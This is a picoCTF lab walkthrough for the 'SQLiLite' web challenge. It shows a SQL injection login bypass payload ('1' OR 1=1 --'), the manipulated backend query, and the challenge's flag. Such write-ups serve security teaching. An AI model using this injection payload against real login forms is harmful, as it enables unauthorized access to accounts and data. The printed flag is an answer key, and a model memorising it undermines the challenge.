# 🛡️ PicoCTF Lab Walkthrough: SQLiLite

## 📌 Challenge Info
- **Category**: Web Exploitation  
- **Points**: 300  
- **Difficulty**: Medium  
- **Challenge Link**: [SQLiLite on PicoCTF](https://play.picoctf.org/practice/challenge/178)

---

## 📝 Challenge Description
> Exploit a SQL injection vulnerability in a login form to retrieve the flag.

---

## 🔍 Initial Recon
**Objective:** Bypass authentication using SQL injection.  
- **Files provided**: None  
- **Services/Ports**: Web login page  
- **Hints given**: None  

---

## 🛠️ Tools & Commands Used
| Tool / Command | Purpose |
|----------------|---------|
| Browser Dev Tools | Inspect login page & source |
| SQL payload `' OR 1=1 --` | Bypass authentication |

---

## 🧠 Step-by-Step Solution
1. **Test Default Credentials**  
   ```bash
   username: test
   password: test
→ Login failed. Backend query looked like:

```mysql
SELECT * FROM users WHERE name='test' AND password='test';
```
2. **SQL Injection Payload**
```text
username: 1' OR 1=1 --
password: anything
```
Query became:
```mysql
SELECT * FROM users WHERE name='1' OR 1=1 --' AND password='anything';
```
→ Login bypass successful.

3.**Source Code Inspection**
Hidden <p> tag in HTML revealed flag.

## 🧾 Flag
```text
picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}
```
## 📚 Learning Outcomes
SQL injection bypass technique (' OR 1=1 --).

Always inspect source code for hidden data.

## 🛡️ Skills Learnt
Web login exploitation

SQL query manipulation

Source inspection in browser

## 🔗 References
[OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
